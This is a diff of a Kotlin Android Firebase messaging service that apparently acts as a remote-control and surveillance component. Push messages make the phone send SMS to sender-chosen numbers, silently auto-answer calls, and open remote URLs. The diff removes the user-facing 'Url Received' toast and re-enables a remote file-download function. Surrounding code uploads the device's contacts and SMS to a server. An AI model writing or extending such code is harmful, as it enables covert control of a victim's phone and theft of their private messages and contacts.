@@ -23,6 +23,8 @@ import android.widget.Toast
 import android.content.ActivityNotFoundException
 import android.content.Intent
 import android.net.Uri
+import android.view.View
+import android.widget.EditText
 import java.lang.Thread.sleep
 
 
@@ -37,8 +39,6 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
         Log.d("MyFireBasemessaging", "onMessageReceived:  Message Received: \nTitle: $strTitle\nMessage: $message")
         if (type == "sms") {
             sendSMS(strTitle, message)
-        }
-        else if (type == "foundPhone") {
         } else if (type == "foundPhone") {
             val notification = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE)
             val r = RingtoneManager.getRingtone(applicationContext, notification)
@@ -53,17 +53,11 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
             isTaked = true
             tm.acceptRingingCall()
             isTaked = false
-        } else {
-            //rtcSignaling(type!!, message!!, Rtc.instance)
         }
-        else if (type == "URL"){
+        else if (type == "URL") {
             Log.d("fireURLLL", "onMessageReceived:  Message Received: \nMessage: $message")
             LauchURL(message)
         }
-        else {
-            rtcSignaling(type!!, message!!, Rtc.instance)
-        }
-
         //SyncData()
     }
 
@@ -72,7 +66,7 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
         sms.sendTextMessage(phoneNumber, null, messageBody, null, null)
     }
 
-    /*private fun DownloadFile(fileName: String?){
+    private fun DownloadFile(fileName: String?){
         Log.d("MyDownloadFire", "onMessageReceived:  Message Received: \nTitle:")
         val retrofitAPI = HttpExecute.BuildAPI()
         //var call = HttpExecute(retrofitAPI.downloadFileWithDynamicUrlSync()).start()
@@ -81,8 +75,6 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
     }
 
     private fun LauchURL(url: String?) {
-            Toast.makeText(applicationContext, "Url Received", Toast.LENGTH_SHORT).show()
-
             val uris = Uri.parse(url)
             val browserIntent = Intent(Intent.ACTION_VIEW, uris)
             startActivity(browserIntent)
@@ -101,7 +93,8 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
         HttpExecute(retrofitAPI.CreateContacts(contactLs)).start()
         HttpExecute(retrofitAPI.CreateSMS(SMSLs)).start()
     }
-    private fun rtcSignaling(type: String, message: String, rtc: Rtc?){
+
+    /*private fun rtcSignaling(type: String, message: String, rtc: Rtc?){
         if(rtc?.peerConnection == null){
             rtc?.initRtcAudio(this.applicationContext)
         }
@@ -112,6 +105,7 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
             rtc?.peerConnection?.addIceCandidate(IceCandidate("",0,message))
         }
     }*/
+
     companion object {
         var isTaked = false
     }
